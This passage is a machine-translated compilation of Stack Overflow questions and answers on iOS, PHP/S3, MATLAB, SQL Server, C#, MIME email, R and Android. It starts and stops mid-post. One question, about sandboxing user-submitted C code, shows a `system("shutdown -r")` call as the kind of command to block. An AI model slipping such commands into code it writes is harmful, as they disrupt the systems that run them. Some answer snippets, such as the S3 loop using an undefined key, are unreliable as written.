      @implementation MailComposeViewController

      -(void)showPicker:(id)viewController andImage:(UIImage*)image;
     {
         Controller = viewController;

           Class mailClass = (NSClassFromString(@"MFMailComposeViewController"));
         if (mailClass != nil)
        {
             // We must always check whether the current device is configured for sending emails
            if ([mailClass canSendMail])
           {
               [self displayComposerSheet:viewController andImage:image];
           }
           else
           {
               //[self launchMailAppOnDevice];
              [self displayComposerSheet:viewController andImage:image];
          }
      }
     else
     {
        //[self launchMailAppOnDevice];
        [self displayComposerSheet:viewController andImage:image];
     }
   }
   -(void)displayComposerSheet:(id)viewController andImage:(UIImage*)image
   {
      MFMailComposeViewController *picker = [[MFMailComposeViewController alloc] init];
     picker.mailComposeDelegate = self;

     NSData *myData = UIImageJPEGRepresentation(image,0.9);
     [picker addAttachmentData:myData mimeType:@"image/jpg" fileName:@""];

      picker.modalPresentationStyle = UIModalPresentationFormSheet;
      picker.modalTransitionStyle = UIModalTransitionStyleCoverVertical;

     [viewController presentModalViewController:picker animated:YES];
    [picker release];
  }
      // Dismisses the email composition interface when users tap Cancel or Send. Proceeds to 
    update the   message field with the result of the operation.
  - (void)mailComposeController:(MFMailComposeViewController*)controller didFinishWithResult:  
  (MFMailComposeResult)result error:(NSError*)error
  {
      //message.hidden = NO;
     // Notifies users about errors associated with the interface
     switch (result)
     {
         case MFMailComposeResultCancelled:
         // message.text = @"Result: canceled";
         break;
         case MFMailComposeResultSaved:
         // message.text = @"Result: saved";
         break;
         case MFMailComposeResultSent:
         //message.text = @"Result: sent";
         break;
         case MFMailComposeResultFailed:
         // message.text = @"Result: failed";
         break;
        default:
            // message.text = @"Result: not sent";
        break;
     }
   [Controller dismissModalViewControllerAnimated:YES];
 }

  - (void)viewDidLoad
   {
         [super viewDidLoad];
     // Do any additional setup after loading the view.
  }

  - (void)didReceiveMemoryWarning
  {
      [super didReceiveMemoryWarning];
      // Dispose of any resources that can be recreated.
  }

  @end 
```

![崩溃快照](https://i.stack.imgur.com/efSfm.png)

```
 Crash Report
  UIKit`-[UIViewController presentModalViewController:animated:]:
  0x3a4d5238:  push   {r7, lr}
 0x3a4d523a:  mov    r7, sp
 0x3a4d523c:  sub    sp, #4
 0x3a4d523e:  movw   r1, #18934
    0x3a4d5242:  mov.w  r9, #0
  0x3a4d5246:  movt   r1, #525
  0x3a4d524a:  str.w  r9, [sp]
  0x3a4d524e:  add    r1, pc
  0x3a4d5250:  ldr    r1, [r1]
   0x3a4d5252:  blx    0x3a734ce4                ; symbol stub for: 
    -[_UIHostedTextServiceSession    dismissTextServiceAnimated:]
  0x3a4d5256:  add    sp, #4
  0x3a4d5258:  pop    {r7, pc}
  0x3a4d525a:  nop 
```

View Controller 和 mailController 的实例打印在控制台上打印 viewController 的描述：打印选择器的描述：（MFMailComposeViewController *）picker =

# php - 如何更新 AWS S3 存储桶中的对象属性

> ID：16215926
> 
> 赞同：2
> 
> 时间：2013-04-25T13:21:20.053
> 
> 标签：php, amazon-s3

我已将近 25k 文件（大型媒体文件）上传到 s3 存储桶。我使用 AWS SDK2 for PHP ( `S3Client::putObject`) 来执行上传。现在，我需要更新这些文件的元数据，即将 ContentDisposition 更改为附件并分配文件名。

有没有办法在不需要重新上传文件的情况下执行此操作？请帮忙。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-06-28T13:50:20.967

是的，您可以使用[copyObject 方法](http://docs.aws.amazon.com/aws-sdk-php-2/latest/class-Aws.S3.S3Client.html#_copyObject)，将`CopySource`参数设置为等于`Bucket`和`Key`参数。

例子：

```
// setup your $s3 connection, and define the bucket and key for your resource.
$s3->copyObject(array(
  'Bucket' => $bucket,
  'CopySource' => "$bucket/$key",
  'Key' => $key,
  'Metadata' => array(
    'ExtraHeader' => 'HEADER VALUE'
  ),
  'MetadataDirective' => 'REPLACE'
)); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2017-07-03T14:48:20.773

更新 S3 对象上的缓存控制元数据

```
<?php
define('S3_BUCKET', 'bucket-name');
define('S3_ACCESS_KEY', 'your-access-key');
define('S3_SECRET_KEY', 'secret-key');
define('S3_REGION', 'ap-south-1'); //Mumbai

require 'vendors/aws/aws-autoloader.php';

use Aws\S3\S3Client;
use Aws\S3\Exception\S3Exception;

try {
    $s3 = S3Client::factory(array(
                'version' => 'latest',
                'region' => S3_REGION,
                'credentials' => array(
                    'secret' => S3_SECRET_KEY,
                    'key' => S3_ACCESS_KEY,
                )
    ));

    $objects = $this->s3->getIterator('ListObjects', array('Bucket' => S3_BUCKET));

    echo "Keys retrieved!\n";
    foreach ($objects as $object) {
        echo $object['Key'] . "\n";
        $s3->copyObject(array(
            'Bucket' => S3_BUCKET,
            'CopySource' => S3_BUCKET . '/' . $object['Key'],
            'Key' => $key,
            'ContentType' => 'image/jpeg',
            'ACL' => 'public-read',
            'StorageClass' => 'REDUCED_REDUNDANCY',
            'CacheControl' => 'max-age=172800',
            'MetadataDirective' => 'REPLACE'
        ));
    }
} catch (S3Exception $e) {
    echo $e->getMessage() . "\n";
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2020-09-20T19:03:12.320

尝试这个

### 用于删除现有对象

```
$keyname = 'product-file/my-object1.dll';
try
{
  $delete = $this->s3->deleteObject([
    'Bucket' => 'belisc',
    'Key'    => $keyname
  ]);

  if ($delete['DeleteMarker']){
    return true;
  } else {
    return false;
  }
}
catch (S3Exception $e) {
  return $e->getAwsErrorMessage();
} 
```

### 对于检查对象

如果对象仍然存在，则返回**true**

```
$keyname = 'product-file/my-object1.dll';
try {
  $this->s3->getObject([
    'Bucket' => 'belisc',
    'Key'    => $keyname
  ]);

  return true;
} catch (S3Exception $e) {
  return $e->getAwsErrorMessage();
} 
```

### 然后就可以上传新的了

```
try {
  return $this->s3->putObject([
    'Bucket' => 'belisc',
    'Key'    => 'product-file/MiFlashSetup_eng.rar',
    'SourceFile' => 'c:\MiFlashSetup_eng.rar'
  ]);
} catch (S3Exception $e) {
  die("There was an error uploading the file. ".$e->getAwsErrorMessage());
} 
```

# matlab - 如何在 MATLAB 中计算信号的 SNR？

> ID：16215930
> 
> 赞同：1
> 
> 时间：2013-04-25T13:21:28.197
> 
> 标签：matlab, signals, noise

我在计算 SNR 时遇到了一个非常简单但基本的问题：

有几个信号：

*   S1 = 没有噪声的原始和纯净的信号。

*   N1 = 将添加到 S1 的高斯白噪声。

*   S2 = S1 + N1（执行降噪算法之前的噪声信号）

*   S3 = 降噪信号（执行降噪算法后）

*   N2 = S3 - S1（执行降噪算法后的噪声量）

现在我想比较执行降噪算法之前和之后的 SNR。

1.  我应该为 SNR_before 考虑哪些信号！？**S1/N1**还是**S2/N1**？

2.  我应该为 SNR_after 考虑哪些信号！？**S3/N1**还是**S3/N2**？

3.  我应该在 MATLAB 中使用哪些命令或函数来计算 SNR_before 和 SNR_after？

感谢十亿您花时间帮助我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T13:34:46.283

我之前对计算snr的了解：

snrBeforeNoise = 均值（信号 .^ 2 ）/均值（噪声 .^ 2 ）；

以及关于 snr 之后：

残留噪声 = 信号 - 噪声减少信号；snr_after = 平均值（信号。^ 2）/平均值（残差噪声。^ 2）；

# php - 在 C 程序中阻止系统命令

> ID：16215931
> 
> 赞同：0
> 
> 时间：2013-04-25T13:21:34.473
> 
> 标签：php, c, system, block, permission-denied

我正在编译和执行一个在 Windows XP Server 上使用 PHP 系统命令的 C 程序。

如果 C 程序包含类似系统命令`System("shutdown -a")`或任何系统命令，那么它会关闭我的系统。

我希望拒绝这些类型的命令。当程序尝试运行系统命令时，如何将“权限被拒绝”显示为输出？

***这是我的代码。***

**PHP 脚本包含 -**

```
system(gcc code.c -o out);    system(out.exe); 
```

**如果 C 程序包含**-

```
int main()     {      system("shutdown -r");   } 
```

有没有办法阻止这些命令运行？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T13:35:14.623

**Windows runas 命令**

您也许可以使用 windows`runas`命令以特定用户身份运行命令。在该用户的个人资料中，设置白名单命令列表。 [https://superuser.com/questions/42537/is-there-any-sudo-command-for-windows](https://superuser.com/questions/42537/is-there-any-sudo-command-for-windows)

**滚动你自己的命令白名单**

在 PHP 或 C 中创建一个允许通过 C 程序运行的命令列表，如果该命令不在批准列表中，则拒绝该命令。或者你们中的一些人喜欢危险地生活，创建一个黑名单，并定义一堆你不想运行的东西。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T13:29:54.437

好的，所以简单的答案是“不要以 root 身份运行”（然后用户只能访问他/她创建的文件，所以造成损害的可能性不大）

更复杂的答案是将代码的运行外包到服务器内的虚拟机上。可以在相当短的时间内从模板（或 VM 软件所称的任何东西）克隆虚拟机。在虚拟机中，运行在那里的代码无法访问它运行的“真实”机器，所以如果用户想要销毁他/她的虚拟机，那是他/她的问题——只需要请求一个“新的虚拟机”机器”，然后才能继续工作。

# vbscript - VBS中的转义和替换引号

> ID：16215932
> 
> 赞同：1
> 
> 时间：2013-04-25T13:21:43.530
> 
> 标签：vbscript, replace, escaping

我需要通过在 vbs 中替换它来转义字符“

我写的

```
 str=8505usafromTo^1c0"ma
 str = replace(str,chr(34),"""") 
```

但似乎 " 不会为字符串 str 转义

拜托，怎么了，有人可以帮我解决这个问题吗？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T13:38:53.767

字符串文字需要双引号：

> str = "8505usafromTo^1c0 ma"

要在字符串文字中转义双引号，请使用 ""（双双引号）

> str = "8505usafromTo^1c0""ma"

用双引号 ("""") 替换字符串中的双引号 (Chr(34)) 是没有意义的。

**更新**：

如果您 .ReadAll()/.ReadLine() 来自文件的字符串并想要更改该字符串中的 "，请使用

> str = Replace(str, """", "这就是我想看到的，而不是每个双引号")

如果您想要 ""（双双引号）作为替换，则需要 """"""（2 个分隔符和两次双引号）。

# ruby - 在 Ubuntu 12.04 上安装 Ruby 2.0.0 时遇到问题

> ID：16215933
> 
> 赞同：1
> 
> 时间：2013-04-25T13:21:46.900
> 
> 标签：ruby

我正在安装 ruby​​ 2.0.0 但找不到一些软件包。首先我使用这个命令

```
rvm get stable 
```

然后我发出命令

```
rvm requirements 
```

我在下面有这些错误

```
W: Failed to fetch http://ppa.launchpad.net/cheleb/blender-svn/ubuntu/dists/precise/main/source/Sources  404  Not Found
W: Failed to fetch http://ppa.launchpad.net/cheleb/blender-svn/ubuntu/dists/precise/main/binary-amd64/Packages  404  Not Found
W: Failed to fetch http://ppa.launchpad.net/cheleb/blender-svn/ubuntu/dists/precise/main/binary-i386/Packages  404  Not Found
W: Failed to fetch http://ppa.launchpad.net/ferramroberto/oneiric/ubuntu/dists/precise/main/source/Sources  404  Not Found
W: Failed to fetch http://ppa.launchpad.net/ferramroberto/oneiric/ubuntu/dists/precise/main/binary-amd64/Packages  404  Not Found
W: Failed to fetch http://ppa.launchpad.net/ferramroberto/oneiric/ubuntu/dists/precise/main/binary-i386/Packages  404  Not Found 
```

我尝试按照以下方式安装

[https://askubuntu.com/questions/169542/how-do-i-install-the-latest-blender-3d-builds-from-a-ppabut](https://askubuntu.com/questions/169542/how-do-i-install-the-latest-blender-3d-builds-from-a-ppabut)

但没有成功，安装 ruby​​ 2.0.0 如下

```
rvm install 2.0.0 
```

给我同样的错误

任何人都可以请帮忙。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T14:31:23.333

这看起来像是 Blender 包的问题。您的系统可能因无法解决的依赖关系而挂起。

看起来你用的是坏镜子。我不确定如何让 Ubuntu 删除该镜像并使用一个正常工作的镜像，但在其他系统中，它需要删除镜像缓存文件并重新构建它。

# sql-server - 如何立即提交存储过程？

> ID：16215935
> 
> 赞同：5
> 
> 时间：2013-04-25T13:21:49.187
> 
> 标签：sql-server, acid

**编辑这个问题不再有效，因为问题是别的。请在我的回答中查看下面的解释。**

**我不确定礼仪，所以我将把这个问题留在当前状态**

我有一个将一些数据写入表的存储过程。

我正在使用 Microsoft Practices Enterprise 库进行存储过程调用。我使用对 ExecuteNonQuery 的调用来调用存储过程。

在 ExecuteNonQuery 返回后，我调用了第 3 方库。它会在大约 100 毫秒后在一个单独的线程上回叫我。

然后我调用另一个存储过程来提取我刚刚编写的数据。在大约 99% 的情况下，数据会返回。有时它不返回任何行（即它找不到数据）。如果我在调试器中设置条件断点来检测这种情况并手动重新运行存储过程，它总是返回我的数据。

这让我相信写入存储过程正在工作，只是在调用时没有提交。

当谈到 sql 时，我是相当新手，所以我完全有可能做错了什么。我原以为写入存储过程会阻塞，直到其内容提交到数据库。

编写存储过程

```
 ALTER PROCEDURE [dbo].[spWrite] 
    @guid varchar(50),
        @data varchar(50)
    AS
    BEGIN
    -- SET NOCOUNT ON added to prevent extra result sets from
    -- interfering with SELECT statements.
    SET NOCOUNT ON;

-- see if this guid has already been added to the table
DECLARE @foundGuid varchar(50);
SELECT @foundGuid = [guid] from [dbo].[Details] where [guid] = @guid; 
    IF @foundGuid IS NULL
    -- first time we've seen this guid
    INSERT INTO [dbo].[Details] ( [guid], data ) VALUES (@guid, @data)
ELSE
    -- updaeting or verifying order
    UPDATE [dbo].[Details]  SET data =@data WHERE [guid] = @guid
END

SET ANSI_NULLS ON
GO
SET QUOTED_IDENTIFIER ON
GO 
```

读取存储过程

```
ALTER PROCEDURE [dbo].[spRead] 
@guid varchar(50)   
AS
BEGIN
-- SET NOCOUNT ON added to prevent extra result sets from
-- interfering with SELECT statements.
SET NOCOUNT ON;

SELECT * from [dbo].[Details] where [guid] = @guid; 
END 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-25T13:45:34.553

要实际阻止其他事务并手动提交，可能会添加

```
BEGIN TRANSACTION
--place your
--transactions you wish to do here

--if everything was okay
COMMIT TRANSACTION
--or
--ROLLBACK TRANSACTION if something went wrong 
```

可以帮助你吗？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T14:03:08.583

我不熟悉您提到的数据访问工具，但是从您的描述中，我猜想要么该过程不等待存储过程完成执行，然后再继续执行下一步，要么您的“其他东西”正在搞砸与您的写入和读取调用之间的数据。

判断发生了什么的一种方法是使用 SQL Profiler。启动它，监视数据库上所有可能的查询执行事件（包括存储过程和存储过程行开始/停止事件），观察 Text 和 Started/Ended 列，将其与跟踪应用程序时看到的时间相关联，以及这应该可以帮助您弄清楚那里发生了什么。（SQL Profiler 使用起来可能很复杂，但是网络上有很多解释它的资源，学习如何使用它非常值得。）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-26T15:16:18.043

我会在下面留下我的答案，因为有评论...

好吧，我觉得我的问题过于简化了。实际发生的是两件事：

1）插入过程实际上是在单独的机器（分布式系统）上运行的。
2）插入过程实际上是在没有事务的情况下将数据插入到两个表中。

这意味着查询可以同时运行并找到处于其中一个已写入但第二个表尚未提交其写入的状态的表。

一个简单的事务解决了这个问题，因为读取查询可以处理无写入或完全写入的情况，但无法处理一个表已写入而另一个表有待提交的情况。

~~事实证明，当我创建存储过程时，MSSQLadmin 工具默认添加了一行：~~

 ~~```
SET NOCOUNT ON; 
```~~ 

如果我把它变成：

```
SET NOCOUNT OFF; 
```

~~然后我的程序实际上正确地提交到数据库。奇怪的是，这个默认值实际上最终会导致问题。~~

# ios - Xcode 无法使用所选设备运行 - 与 Xcode 版本对应的错误？

> ID：16215936
> 
> 赞同：0
> 
> 时间：2013-04-25T13:21:49.187
> 
> 标签：ios, xcode, deployment, device

我的代码运行良好，直到我更新了我的 iphone 操作系统（现在是 ios 6.1。现在我不再能够在我的设备上部署 - 它给了我错误“Xcode 无法使用所选设备运行”。

同样的问题出现在许多其他 stackoverflow 问题中，但似乎没有一个对我有用。从[Xcode cannot run using the selected device](https://stackoverflow.com/questions/5382772/xcode-cannot-run-using-the-selected-device)的问题来看，我认为我需要升级 Xcode。当前版本 = 4.5.2 - 它没有将 ios 6.1 显示为部署目标。我将尝试获取最新的 Xcode 4.6.2，但同时我想我会在这里提出这个问题。

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T13:41:01.850

您的假设是正确的：如果您观看 Xcode 发行说明 ( [http://developer.apple.com/library/ios/#releasenotes/DeveloperTools/RN-Xcode/index.html](http://developer.apple.com/library/ios/#releasenotes/DeveloperTools/RN-Xcode/index.html) )，您可以看到添加了 iOS SDK 6.1使用 Xcode 4.6。

# c# - C#防止CMD在运行后自动关闭？

> ID：16215938
> 
> 赞同：1
> 
> 时间：2013-04-25T13:21:51.453
> 
> 标签：c#, console, console-application, filestream

我想防止 CMD 在运行程序后自动关闭。

代码：

```
static void Main(string[] args)
    {

        FileStream textfsw = new FileStream("fileone.txt", FileMode.Append, FileAccess.Write); // CREATING FILE
        StreamWriter textsw = new StreamWriter(textfsw);

        Console.Write(" Enter your ID: ");
        int ID = int.Parse(Console.ReadLine());
        Console.Write(" Enter your Name: ");
        string Name = Console.ReadLine();
        Console.WriteLine(" Thank you! your logged in as" +Name+ +ID);

        textsw.Close();
        textfsw.Close();

        FileStream textfs = new FileStream("fileone.txt", FileMode.Open, FileAccess.Read); // READING A FILE USING ReadAllLines
        StreamReader textsr = new StreamReader(textfs);

        String[] lines = File.ReadAllLines("fileone.txt");
    } 
```

截屏： ![运行截图后](https://i.stack.imgur.com/SiyD4.jpg)

我想在运行后显示以下内容并防止 cmd 关闭：

```
Thank you! your logged in as John Smith 12345 
```

任何答案将不胜感激。

谢谢你。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-25T13:22:59.593

您可以使用[`Console.ReadKey()`](http://msdn.microsoft.com/en-GB/library/471w8d85.aspx), 等待直到按下单个键（并返回它，但在这种情况下我们不需要它）。

这是一种替代方法[`Console.ReadLine()`](http://msdn.microsoft.com/en-us/library/system.console.readline.aspx)，[`Console.Read()`](http://msdn.microsoft.com/en-GB/library/system.console.read.aspx)需要用户按回车键。

* * *

顺便说一句，在使用文件访问（并使用[`IDisposable`](http://msdn.microsoft.com/en-us/library/system.idisposable.aspx)通常实现的对象）时，您应该使用[`using`语句](http://msdn.microsoft.com/en-gb/library/yh598w02.aspx)来确保在所有情况下都释放所有资源：

```
using(FileStream textfs = new FileStream("fileone.txt", FileMode.Open, FileAccess.Read))
{
    using(StreamReader textsr = new StreamReader(textfs))
    {
        // Do things with textfs and textsr
    }
} 
```

另请注意，由于您正在使用`File.ReadAllLines`，因此不需要上述任何内容，因为它会为您完成。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-25T13:22:45.573

最后使用`Console.Read()`来实现这一点。

```
Console.WriteLine("Thank you! your logged in as" + Name + ID);
Console.Read(); 
```

正如乔治所提到的，您也可以使用 ReadKey() 或者您可以使用 ReadLine();

# php - Windows 中的 PEAR SMTP 行为

> ID：16215940
> 
> 赞同：0
> 
> 时间：2013-04-25T13:21:58.220
> 
> 标签：php, smtp, pear

我有一个奇怪的问题。

我在 Ubuntu 上使用 PEAR SMTP。当我发送此消息时：

```
--==Alternative_Boundary_x{da5ccf044317613d9f8e371455f292a6}x
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: 7bit

hello world - plain text test
--==Alternative_Boundary_x{da5ccf044317613d9f8e371455f292a6}x
Content-Type: text/html; charset="utf-8"
Content-Transfer-Encoding: 7bit

<i>hello world - html test</i>
--==Alternative_Boundary_x{da5ccf044317613d9f8e371455f292a6}x--

--==Mixed_Boundary_x{e46253d4aad6aff75d74ef5eb064a626}x
Content-Type: application/rtf; name="attachment.rtf"
Content-Disposition: attachment; filename="attachment.rtf"
Content-Transfer-Encoding: base64

e1xydGYxXGFuc2lcZGVmZjB7XGZvbnR0Ymx7XGYwXGZtb2Rlcm5cZnBycTFcZmNoYXJzZXQwIENv
dXJpZXIgTmV3O317XGYxXGZuaWxcZmNoYXJzZXQwIENvdXJpZXIgTmV3O319DQp7XGNvbG9ydGJs
IDtccmVkMFxncmVlbjBcYmx1ZTA7fQ0Ke1wqXGdlbmVyYXRvciBNc2Z0ZWRpdCA1LjQxLjE1LjE1
MTU7fVx2aWV3a2luZDRcdWMxXHBhcmRcY2YxXGxhbmcyMDU3XGYwXGZzMzIgSGVsbG8gd29ybGRc
Y2YwXGYxXGZzMjBccGFyDQpcY2YxXGlcZjBcZnMyNCBIZWxsbyB3b3JsZFxjZjBcaTBcZjFcZnMy
MFxwYXINClxiIEhlbGxvIHdvcmxkXHBhcg0KXGIwXHBhcg0KXHBhcg0KfQ0KAA==

--==Mixed_Boundary_x{e46253d4aad6aff75d74ef5eb064a626}x
--==Mixed_Boundary_x{e46253d4aad6aff75d74ef5eb064a626}x
Content-Type: text/xml; name="attachment.xml"
Content-Disposition: attachment; filename="attachment.xml"
Content-Transfer-Encoding: base64

PD94bWwgdmVyc2lvbj0iMS4wIj8+DQo8YXR0YWNoZW1udD5pbiAueG1sIGZpbGU8L2F0dGFjaGVt
bnQ+IA==

--==Mixed_Boundary_x{e46253d4aad6aff75d74ef5eb064a626}x-- 
```

我收到它时没有缺少一个**--==Mixed_Boundary_x{e46253d4aad6aff75d74ef5eb064a626}x**（看看哪里有两个连续的）。一些 PEAR smtp send 如何发送缺少该消息的消息。

但是，如果我使用 phplib 从 Windows 执行此操作，它会发送得很好并导致附件正常工作！

我知道我可以使用 PEAR Mime 邮件来处理这个问题，但不幸的是，我正在使用遗留代码，这不是一个选项，因为邮件已经包含所有编码。

我的问题是，为什么 PEAR 删除它？当不存在时，它会破坏附件吗？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T13:31:24.770

我只能根据您提供的内容进行假设，但是您边界中的 Ascii-Art 非常好，但可能有点过头了。它包含根据规范不允许出现的字符，即大括号。也许是因为那里有一封无效的电子邮件，所以事情被丢弃了？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T15:52:10.200

得到它的工作！事实证明，额外的线路根本不应该在那里，并且导致了各种问题。设法更改了一些代码，使其不存在并且一切都开始工作了！

# java - 如何让我的 android 应用程序通过 facebook 登录并获取foursquare 之类的朋友列表

> ID：16215941
> 
> 赞同：-1
> 
> 时间：2013-04-25T13:22:04.683
> 
> 标签：java, android, facebook, social-networking, foursquare

我正在开发 android 应用程序，我需要它通过 facebook 登录并获取用户朋友列表以邀请他们使用该应用程序并在时间轴上发布，例如 Foursquare

有什么稳定的方法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T13:25:23.500

[https://developers.facebook.com/docs/getting-started/facebook-sdk-for-android/3.0/](https://developers.facebook.com/docs/getting-started/facebook-sdk-for-android/3.0/)

只需阅读此书，它包含您需要知道的一切

# r - R中不同事件的枚举

> ID：16215942
> 
> 赞同：2
> 
> 时间：2013-04-25T13:22:04.910
> 
> 标签：r, permutation, combinations

我正在寻找一种通用方法来枚举与以下问题相关的序列并将结果存放在 R 中的 3 维矩阵中。

我认为必须有一个组合解决方案，但我一直找不到。希望下面详述的内容将充分描述该问题。欢迎任何帮助。

假设有 n 个周期和 c 个不同的区域，其中事件 e 的发生必须在每个区域中恰好发生一次，那么可能的序列的枚举是多少？

例如，如果有 3 个时间段 {1,2,3} 和 2 个区域 {a,b}，手动枚举解决方案给出：

```
Period 1    2    3
Area   a b  a b  a b
Sol 1  e e  - -  - -   ; ie event occurs in both areas at time 1, nothing happens at time 2 and 3
Sol 2  - -  e e  - -   ; event occurs in both areas at time 2 etc
Sol 3  - -  - -  e e
Sol 4  e -  - e  - -
Sol 5  e -  - -  - e
Sol 6  - e  e -  - -
Sol 7  - e  - -  e -
Sol 8  - -  e -  - e
Sol 9  - -  - e  e - 
```

无论区域数量和时间步数如何，我所知道的是解决方案的数量将始终为 n^c。对于这种情况，事件在“a”中发生的 3 种方式乘以事件在“b”中发生的 3 种方式，3 x 3 = 9 个不同的序列。如前所述，我希望为任意数量的周期和任意数量的区域实施通用解决方案，并将结果存储在由 [time][area][sequence] 索引的矩阵中。谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-26T03:05:42.833

Many thanks. I believe the following is working correctly.

```
# Solution:
numperiods <- 4
numevents <- 2
numseqs <- numperiods^numevents

gridparam <- rep(list(seq(numperiods)),numevents)
g <- as.matrix(expand.grid(gridparam))
print(g)

m <- t(apply(g, 1, 
         function(z) {
            x <- rep(0, numperiods*numevents) 
            for (i in 1:numseqs) 
            {
              x[numevents * z[i] - (numevents-i)] <- 1
            }
            x
         }))
print(m)

result <- array(m,c(numseqs,numevents,numperiods))
colnames(result) <- outer("Event",1:numevents, paste)
rownames(result) <- outer("Seq", 1:numseqs, paste)
# Time period is third dim
print(result) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T14:31:58.367

所以有两个事件，每个事件都可能发生在三个时期之一。您可以使用以下方法枚举发生 2 个事件的所有可能的时段组合`expand.grid`：

```
g <- as.matrix(expand.grid( seq(3), seq(3) ))
print(g)
      Var1 Var2
 [1,]    1    1
 [2,]    2    1
 [3,]    3    1    
 [4,]    1    2
 [5,]    2    2
 [6,]    3    2
 [7,]    1    3
 [8,]    2    3
 [9,]    3    3 
```

现在循环`g`并返回在正确索引处具有 1（“事件”）的向量的行：

```
m <- t(apply(g, 1, 
             function(z) {
               x <- rep(0, 6)
               x[2 * z[1] - 1] <- 1
               x[2 * z[2]] <- 1
               x
             }))
print(m)
      [,1] [,2] [,3] [,4] [,5] [,6]
 [1,]    1    1    0    0    0    0
 [2,]    0    1    1    0    0    0
 [3,]    0    1    0    0    1    0
 [4,]    1    0    0    1    0    0
 [5,]    0    0    1    1    0    0
 [6,]    0    0    0    1    1    0
 [7,]    1    0    0    0    0    1
 [8,]    0    0    1    0    0    1
 [9,]    0    0    0    0    1    1 
```

这是您正在寻找的二进制形式的矩阵。

如果您有超过 2 个事件，请添加另一个`seq(3)`inside `expand.grid`，并调整 inside 函数`apply`。同样，如果超过 3 个句点，则更`seq(3)`改为`seq(number.of.periods)`。

# android - 使用异步任务时的Android空指针异常

> ID：16215943
> 
> 赞同：0
> 
> 时间：2013-04-25T13:22:14.980
> 
> 标签：android, json

我的课堂上有一个异步任务，它是关于解析 JSON 的。但是当我执行代码时，在 LogCat 中我看到了消息：FATAL EXCEPTION: AsyncTask #1

.

.

.

引起：java.lang.NullPointerException。

如果您想查看它，这是我的代码：

MainActivity.java

```
 protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);

         new ReadJSON().execute(there is an address here);

         textView = (TextView) findViewById(R.id.textView1);
   }

   //async task:
    InputStream inputStream = null;
    String result = null;
    HttpResponse response;
    BufferedReader reader;
    JSONObject jObject;
    String aJsonString1;
    String aJsonString2;

    public class ReadJSON extends AsyncTask<String, Void, String> {
        protected String doInBackground(String... url) {

            DefaultHttpClient   httpclient = new DefaultHttpClient(new BasicHttpParams());
            HttpPost httppost = new HttpPost(there is the same address here);
            // Depends on your web service
            httppost.setHeader("Content-type", "application/json");

            try {
                response = httpclient.execute(httppost);
            } catch (ClientProtocolException e) {
                // TODO Auto-generated catch block
                    e.printStackTrace();
            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }           
            HttpEntity entity = response.getEntity();

            try {
                inputStream = entity.getContent();
            } catch (IllegalStateException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
            // json is UTF-8 by default i beleive

            try {
                reader = new BufferedReader(new InputStreamReader(inputStream, "UTF-8"), 8);
            } catch (UnsupportedEncodingException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
            StringBuilder sb = new StringBuilder();

            String line = null;
            try {
                while ((line = reader.readLine()) != null)
                {
                    sb.append(line + "\n");
                }
            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
            result = sb.toString();

            try {
                jObject = new JSONObject(result);
            } catch (JSONException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
            try {
                aJsonString1 = jObject.getString("value");
            } catch (JSONException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
            try {
                aJsonString2 = jObject.getString("timestamp");
            } catch (JSONException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }

            return aJsonString1;

        }

            protected void onPostExecute(String result) {
                textView.setText(aJsonString1);

            }

    } 
```

你能看出这里的问题吗？有人有想法吗？

提前致谢

编辑：这是LogCat：

```
 04-25 16:27:06.851: W/System.err(4697):  at     android.os.AsyncTask$2.call(AsyncTask.java:287)
   04-25 16:27:06.861: W/System.err(4697):  at java.util.concurrent.FutureTask.run(FutureTask.java:234)
   04-25 16:27:06.861: W/System.err(4697):  at android.os.AsyncTask$SerialExecutor$1.run(AsyncTask.java:230)
   04-25 16:27:06.871: W/System.err(4697):  at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1080)
   04-25 16:27:06.871: W/System.err(4697):  at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:573)
   04-25 16:27:06.881: W/System.err(4697):  at java.lang.Thread.run(Thread.java:856)
   04-25 16:27:06.891: W/dalvikvm(4697): threadid=11: thread exiting with uncaught exception (group=0x40a71930)
   04-25 16:27:06.911: E/AndroidRuntime(4697): FATAL EXCEPTION: AsyncTask #1
   04-25 16:27:06.911: E/AndroidRuntime(4697): java.lang.RuntimeException: An error occured while executing doInBackground()
   04-25 16:27:06.911: E/AndroidRuntime(4697):  at android.os.AsyncTask$3.done(AsyncTask.java:299)
   04-25 16:27:06.911: E/AndroidRuntime(4697):  at java.util.concurrent.FutureTask.finishCompletion(FutureTask.java:352)
   04-25 16:27:06.911: E/AndroidRuntime(4697):  at java.util.concurrent.FutureTask.setException(FutureTask.java:219)
